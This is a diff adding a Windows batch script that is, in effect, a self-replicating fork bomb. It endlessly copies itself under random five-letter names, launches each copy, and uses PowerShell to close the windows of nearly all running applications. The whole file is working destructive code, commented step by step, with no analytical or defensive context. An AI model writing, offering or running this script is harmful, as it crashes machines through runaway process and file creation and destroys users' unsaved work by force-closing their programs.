@@ -1,0 +1,32 @@
+@echo off
+:restart
+setlocal enabledelayedexpansion
+
+:: Define the alphabet string
+set "alphabet=abcdefghijklmnopqrstuvwxyz"
+
+:: Initialize an empty variable for the random name
+set "random_name="
+
+:: Loop 5 times to pick 5 random letters
+for /l %%i in (1,1,5) do (
+    set /a "rand_idx=!random! %% 26"
+    for /f "delims=" %%j in ("!rand_idx!") do (
+        set "random_name=!random_name!!alphabet:~%%j,1!"
+    )
+)
+
+:: Set the full output filename
+set "new_filename=!random_name!.bat"
+
+:: Duplicate this file to the new random name
+copy "%~f0" "!new_filename!" >nul
+
+:: Run the newly duplicated batch file
+start "" "!new_filename!"
+
+powershell -NoProfile -Command ^
+    "Get-Process | Where-Object { $_.MainWindowTitle -and $_.ProcessName -notin 'cmd','powershell','explorer' } | ForEach-Object { $_.CloseMainWindow() }"
+
+endlocal
+goto restart
